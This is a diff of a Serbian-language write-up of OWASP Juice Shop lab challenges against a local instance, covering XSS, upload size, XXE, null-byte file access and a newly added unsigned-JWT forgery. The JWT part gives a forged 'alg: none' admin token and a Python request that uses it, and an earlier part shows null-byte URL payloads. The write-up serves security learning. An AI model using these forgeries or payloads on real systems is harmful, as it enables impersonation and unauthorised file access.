@@ -1,6 +1,6 @@
 ## 1) Persisted XSS
 
-**Назив изазова у апликацији**: **Client-side XSS Protection**
+**Назив изазова у апликацији**: **Client-side XSS Protection** `***`
 
 **Класа напада**: Arbitrary code execution
 
@@ -26,7 +26,7 @@
 
 ## 2) Окачи превелик фајл
 
-**Назив изазова у апликацији**: **Upload Size**
+**Назив изазова у апликацији**: **Upload Size** `***`
 
 **Класа напада**: Denial of Service / Flood Attack
 
@@ -45,11 +45,11 @@
 
 Трик је да покренем интерцептор и нађем где се шаље сам фајл. Тамо постоји `content: ...`, и све што треба да урадим је да за вредност `content` поља додам неко додатно смеће (нпр. `hf389dh9ewhf39hd32...`), тек толико да величина тог фајла буде изнад 100KB.
 
-## 3) Добави `C:\Windows\system.ini`
+## 3) Добави `C:\Windows\system.ini` 
 
-**Назив изазова у апликацији**: **XXE Data Access**
+**Назив изазова у апликацији**: **XXE Data Access** `***`
 
-**Класа напада**: Инјекција, SSRF
+**Класа напада**: SSRF
 
 **Утицај**: Могуће је слободно се кретати по фајл систему рачунара на којем трчи
 сервер. Могу се добавити тајни кључеви, шивре, логови, аналитика итд.
@@ -80,11 +80,11 @@ https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files
 И онда само треба да преварим веб апликацију да шаље зип (променим екстензију) а
 у интерцептору вратим на xml.
 
-## 4) Неовлашћен приступ фајловима
+## 4) Неовлашћен приступ фајловима 
 
-**Назив изазова у апликацији**: **Misplaced Signature File** и **Poison Null Byte**
+**Назив изазова у апликацији**: **Misplaced Signature File** `****` и **Poison Null Byte** `****`
 
-**Класа напада**: Инјекција
+**Класа напада**: Злоупотреба контроле приступа
 
 **Утицај**: Нападач може приступити фајловима које је сервер заштитио.
 
@@ -126,16 +126,80 @@ localhost:3000/ftp/suspicious_errors.yml%00.md
 localhost:3000/ftp/suspicious_errors.yml%2500.md
 ```
 
-## 5) 
+## 5) Лажирај JWT
 
-**Назив изазова у апликацији**: ****
+**Назив изазова у апликацији**: **Unsigned JWT** `*****`
 
-**Класа напада**:
+**Класа напада**: Злоупотреба лоше аутентификације
 
-**Утицај**:
+**Утицај**: Нападач се може представити као неко други.
 
-**Рањивости**:
+**Рањивости**: Користи се библиотека која дозвољава `none` алгоритам. Не форсира се одређени алгоритам при провери JWT-а.
 
-**Контрамере**:
+**Контрамере**: Користити бољу библиотеку за JWT или експлицитно захтевати да се провера ради по том-и-том алгоритму.
+
+```java
+JWTVerifier verifier = JWT.require(Algorithm.HMAC256(keyHMAC)).build();
+```
 
 **Белешке**:
+
+Преко интерцептора могу да добавим JWT када пошаљем неки захтев. Њега ћу да модификујем.
+[Тражио сам](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771) како се прави _unsigned jwt_. 
+JWT нуди да вредност алгоритма у заглављу
+буде `none` тј. без аутентификације:
+
+```json
+{
+  "typ": "JWT",
+  "alg": "none"
+}
+```
+
+У телу је довољно само променити имејл:
+
+```json
+{
+  "status": "success",
+  "data": {
+    "id": 1,
+    "username": "ghjghjg",
+    "email": "jwtn3d@juice-sh.op",
+    "password": "0192023a7bbd73250516f069df18b500",
+    "role": "admin",
+    "deluxeToken": "",
+    "lastLoginIp": "127.0.0.1",
+    "profileImage": "assets/public/images/uploads/defaultAdmin.png",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2024-04-01 08:16:43.007 +00:00",
+    "updatedAt": "2024-04-01 09:14:30.336 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1711963175
+}
+```
+
+а последњу секцију, везану за криптографију, се брише.
+
+Када се ово енкодира у base64, избаци `=` и дода тачка на крају сваке секције,
+добијемо JWT:
+
+```
+ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogImdoamdoamciLAogICAgImVtYWlsIjogImp3dG4zZEBqdWljZS1zaC5vcCIsCiAgICAicGFzc3dvcmQiOiAiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLAogICAgInJvbGUiOiAiYWRtaW4iLAogICAgImRlbHV4ZVRva2VuIjogIiIsCiAgICAibGFzdExvZ2luSXAiOiAiMTI3LjAuMC4xIiwKICAgICJwcm9maWxlSW1hZ2UiOiAiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA4OjE2OjQzLjAwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA5OjE0OjMwLjMzNiArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNzExOTYzMTc1Cn0.
+```
+
+И сад само пошаљем захтев са лажираним JWT-ом:
+
+```py
+import requests
+
+fake_jwt = 'ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogImdoamdoamciLAogICAgImVtYWlsIjogImp3dG4zZEBqdWljZS1zaC5vcCIsCiAgICAicGFzc3dvcmQiOiAiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLAogICAgInJvbGUiOiAiYWRtaW4iLAogICAgImRlbHV4ZVRva2VuIjogIiIsCiAgICAibGFzdExvZ2luSXAiOiAiMTI3LjAuMC4xIiwKICAgICJwcm9maWxlSW1hZ2UiOiAiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA4OjE2OjQzLjAwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA5OjE0OjMwLjMzNiArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNzExOTYzMTc1Cn0.'
+
+respo = requests.get(
+    "http://localhost:3000/api/Users",
+    headers={
+        'Authorization': f"Bearer {fake_jwt}"
+    }
+)
+```
